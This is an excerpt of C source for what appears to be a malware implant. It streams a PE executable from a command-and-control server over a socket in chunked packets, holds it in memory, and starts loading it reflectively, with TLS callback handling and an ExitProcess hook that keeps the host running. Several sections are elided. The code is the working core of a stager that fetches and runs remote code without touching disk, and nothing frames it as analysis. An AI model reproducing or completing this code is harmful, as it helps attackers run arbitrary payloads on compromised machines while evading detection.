...
void WINAPI MyExitProcess(UINT uExitCode) {
    printf("[!] Guest PE tried to exit. Terminating thread only.\n");
    ExitThread(uExitCode); 
}

PBYTE GetPEFromC2(SOCKET* s, PC2_PACKET pFirstPkt) {
    C2_PACKET pkt = { 0 };
    
    // Check if the packet passed is actually the size announcement
    if (pFirstPkt->CmdId != 0x3) {
        printf("[!] Error: Packet passed to GetPEFromC2 is not CmdId 0x3\n");
        return NULL;
    }

    // Retrieve the size from the packet we ALREADY received in main()
    SIZE_T totalSize = *(SIZE_T*)pFirstPkt->Data;
    ...
    while (bytesReceived < totalSize) {
        // Now we call recv for the actual data chunks (CmdId 4)
        recvC2Packet(s, &pkt);
        
        if (pkt.CmdId != 0x4) {
            printf("[!] Error during PE streaming: Unexpected CmdId %lu\n", pkt.CmdId);
            VirtualFree(peBuffer, 0, MEM_RELEASE);
            return NULL;
        }

        SIZE_T remaining = totalSize - bytesReceived;
        SIZE_T toCopy = (remaining < 4096) ? remaining : 4096;

        memcpy(peBuffer + bytesReceived, pkt.Data, toCopy);
        bytesReceived += toCopy;
        
        printf("[*] Progress: %zu/%zu bytes received\n", bytesReceived, totalSize);
    }

    printf("[+] PE fully received in memory.\n");
    return peBuffer;
}

VOID ExecutePELoader(PBYTE pe_base) {
    ...
    if (tlsDir.Size)
    {
        ...
        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)(tls->AddressOfCallBacks + delta);
